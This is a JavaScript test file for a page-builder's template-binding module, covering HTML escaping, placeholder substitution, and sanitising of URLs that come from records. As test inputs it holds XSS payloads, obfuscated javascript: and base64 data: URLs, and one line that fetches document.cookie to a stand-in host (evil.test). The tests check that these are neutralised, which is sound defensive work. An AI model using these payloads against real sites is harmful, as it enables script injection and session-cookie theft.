import { describe, expect, test } from 'bun:test';
import { bindBlock, bindText, escapeHtml, placeholdersIn, valueToText } from './bind.js';

describe('escaping', () => {
  test('a value landing in an HTML property is escaped', () => {
    // The whole reason this module exists. The template is sanitised while it is
    // stored; the value is substituted afterwards, so escaping here is the only
    // moment both are in hand.
    const out = bindText('<p>Hello {{name}}</p>', { name: '<img src=x onerror=alert(1)>' }, true);
    expect(out).toBe('<p>Hello &lt;img src=x onerror=alert(1)&gt;</p>');
    expect(out).not.toContain('<img');
  });

  test('a value landing in a TEXT property is not escaped here', () => {
    // Svelte escapes a text node itself. Escaping first as well would show the
    // reader `&lt;b&gt;` where the record says `<b>`.
    expect(bindText('Hi {{name}}', { name: '<b>Ana</b>' })).toBe('Hi <b>Ana</b>');
  });

  test('quotes are escaped too, so a value cannot break out of an attribute', () => {
    expect(escapeHtml('a"b\'c')).toBe('a&quot;b&#39;c');
  });

  test('ampersands are escaped once, not twice', () => {
    expect(escapeHtml('R&D')).toBe('R&amp;D');
  });
});

describe('substitution', () => {
  test('replaces a placeholder with the record value', () => {
    expect(bindText('Hi {{first_name}}', { first_name: 'Ana' })).toBe('Hi Ana');
  });

  test('tolerates spaces inside the braces', () => {
    expect(bindText('{{ first_name }}', { first_name: 'Ana' })).toBe('Ana');
  });

  test('an unknown field resolves to empty, not to the literal placeholder', () => {
    // `{{phone}}` printed on a published page is worse than a blank, and it is
    // what a reader reports as a bug.
    expect(bindText('Call {{phone}}.', { first_name: 'Ana' })).toBe('Call .');
  });

  test('a null value resolves to empty', () => {
    expect(bindText('[{{note}}]', { note: null })).toBe('[]');
  });

  test('leaves text with no placeholders alone', () => {
    expect(bindText('nothing here', { a: 1 })).toBe('nothing here');
  });

  test('replaces every occurrence, not just the first', () => {
    expect(bindText('{{a}}-{{a}}', { a: 'x' })).toBe('x-x');
  });
});

describe('value formatting', () => {
  test('booleans read as a tick or a dash', () => {
    expect(valueToText(true)).toBe('✓');
    expect(valueToText(false)).toBe('—');
  });

  test('an object becomes compact JSON rather than [object Object]', () => {
    expect(valueToText({ a: 1 })).toBe('{"a":1}');
  });

  test('a plain string is left exactly as stored', () => {
    expect(valueToText('SKU-001')).toBe('SKU-001');
  });

  test('null and undefined are empty', () => {
    expect(valueToText(null)).toBe('');
    expect(valueToText(undefined)).toBe('');
  });
});

describe('binding a block', () => {
  const template = {
    id: 'tpl',
    type: 'container',
    content: {
      gap: 'md',
      children: [
        { id: 'h', type: 'richtext', content: { content: '<h3>{{first_name}} {{last_name}}</h3>' } },
        { id: 'b', type: 'button', col_span: 4, content: { label: 'Email {{first_name}}', href: 'mailto:{{email}}' } },
      ],
    },
  };

  test('binds nested blocks at every depth', () => {
    const out = bindBlock(template, { first_name: 'Ana', last_name: 'Pop', email: 'ana@x.example' }, 0);
    expect(out.content.children[0].content.content).toBe('<h3>Ana Pop</h3>');
    expect(out.content.children[1].content.label).toBe('Email Ana');
    expect(out.content.children[1].content.href).toBe('mailto:ana@x.example');
  });

  test('the same value is escaped in `content` and left raw in `label`', () => {
    const out = bindBlock(template, { first_name: '<b>x</b>', last_name: '', email: 'e' }, 0);
    // `content` is rendered with {@html}; `label` is a text node.
    expect(out.content.children[0].content.content).toContain('&lt;b&gt;x&lt;/b&gt;');
    expect(out.content.children[1].content.label).toBe('Email <b>x</b>');
  });

  test('non-string properties survive untouched', () => {
    const out = bindBlock(template, { first_name: 'Ana' }, 0);
    expect(out.content.children[1].col_span).toBe(4);
    expect(out.content.gap).toBe('md');
  });

  test('every copy gets distinct ids, at every depth', () => {
    const a = bindBlock(template, { first_name: 'Ana' }, 0);
    const b = bindBlock(template, { first_name: 'Dan' }, 1);
    expect(a.id).not.toBe(b.id);
    expect(a.content.children[0].id).not.toBe(b.content.children[0].id);
    // A keyed list that reuses one id starts reusing the wrong DOM node.
    expect(new Set([a.id, b.id, a.content.children[0].id, b.content.children[0].id]).size).toBe(4);
  });

  test('the template itself is never mutated', () => {
    bindBlock(template, { first_name: 'Ana' }, 0);
    expect(template.content.children[0].content.content).toBe('<h3>{{first_name}} {{last_name}}</h3>');
    expect(template.id).toBe('tpl');
  });

  test('a hostile record value cannot become markup in an HTML property', () => {
    const out = bindBlock(template, {
      first_name: '<script>alert(1)</script>',
      email: 'x',
    }, 0);
    expect(out.content.children[0].content.content).not.toContain('<script');
    expect(out.content.children[0].content.content).toContain('&lt;script&gt;');
  });
});

describe('placeholdersIn', () => {
  test('lists every field a template refers to, once', () => {
    const found = placeholdersIn({
      type: 'container',
      content: {
        children: [
          { type: 'richtext', content: { content: '{{a}} and {{b}}' } },
          { type: 'button', content: { label: '{{a}}', href: '/x' } },
        ],
      },
    });
    expect(found.sort()).toEqual(['a', 'b']);
  });

  test('an empty template refers to nothing', () => {
    expect(placeholdersIn({ type: 'spacer', content: { height: 20 } })).toEqual([]);
  });
});

/**
 * The third sink: a record value bound into an `href` or `src`.
 *
 * The rule at the top of `bind.ts` reasoned about two — a value going into
 * `{@html}` is escaped, one going anywhere else is not, because Svelte escapes a
 * text node. A URL attribute is neither, and Svelte will not neutralise
 * `javascript:` in `href={…}`.
 *
 * The template is admin-authored, which is fine: an admin who can write an `html`
 * block can already run script. The RECORD is not — a CRM contact, a form
 * submission, an imported row — and it is what lands in the attribute.
 */
describe('URL sinks', () => {
  test('a javascript: URL from a record does not reach an href', () => {
    const template = { id: 'card', type: 'button', content: { href: '{{website}}' } };
    for (const hostile of [
      "javascript:fetch('//evil.test/'+document.cookie)",
      'JaVaScRiPt:alert(1)',
      '  javascript:alert(1)',
      'java\tscript:alert(1)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      '//evil.test/steal',
    ]) {
      const bound = bindBlock(template, { website: hostile }, 0);
      expect(bound.content.href, `hostile URL survived: ${hostile}`).toBe('');
    }
  });

  test('ordinary URLs still work — the control', () => {
    // Without this, a `safeUrl` that returned '' for everything would pass above
    // and silently break every link on every record page.
    const template = { id: 'card', type: 'button', content: { href: '{{site}}' } };
    for (const ok of [
      'https://example.test/page',
      'http://example.test',
      'mailto:a@example.test',
      'tel:+40123456789',
      '/about',
      'about/us',
      '#section',
      '?q=1',
      '/search?q=a:b',
    ]) {
      expect(bindBlock(template, { site: ok }, 0).content.href).toBe(ok);
    }
  });

  test('every URL key the renderer binds is covered', () => {
    // The list is only as good as this: each key, exercised through bindBlock.
    for (const key of ['href', 'url', 'src', 'link', 'cta_url', 'button_url', 'image_url']) {
      const bound = bindBlock(
        { id: 'b', type: 'x', content: { [key]: '{{u}}' } },
        { u: 'javascript:alert(1)' },
        0,
      );
      expect(bound.content[key], `${key} is not covered by URL_KEYS`).toBe('');
    }
  });

  test('a static block is untouched — only bound blocks carry record data', () => {
    // An admin authoring a literal URL is exercising a capability they have.
    // `bindBlock` is only reached for record-bound templates, and this asserts
    // the substitution is what triggers the check, not the key name alone.
    const bound = bindBlock(
      { id: 'b', type: 'x', content: { href: 'https://example.test' } },
      { unrelated: 1 },
      0,
    );
    expect(bound.content.href).toBe('https://example.test');
  });
});

describe('URL sinks — nested', () => {
  test('a gallery image URL from a record is guarded too', () => {
    // `{#each c.images as img}` … `<img src={img.url}>`. The property is nested
    // one level below the block's own keys, and the URL check used to run only
    // on those. HTML_KEYS was already consulted at every level; this was not.
    const bound = bindBlock(
      { id: 'g', type: 'gallery', content: { images: [{ url: '{{u}}', alt: 'x' }] } },
      { u: 'javascript:alert(1)' },
      0,
    );
    expect(bound.content.images[0].url).toBe('');
    expect(bound.content.images[0].alt).toBe('x');
  });

  test('and a legitimate nested URL still survives', () => {
    const bound = bindBlock(
      { id: 'g', type: 'gallery', content: { images: [{ url: '{{u}}' }] } },
      { u: 'https://cdn.example.test/a.png' },
      0,
    );
    expect(bound.content.images[0].url).toBe('https://cdn.example.test/a.png');
  });
});
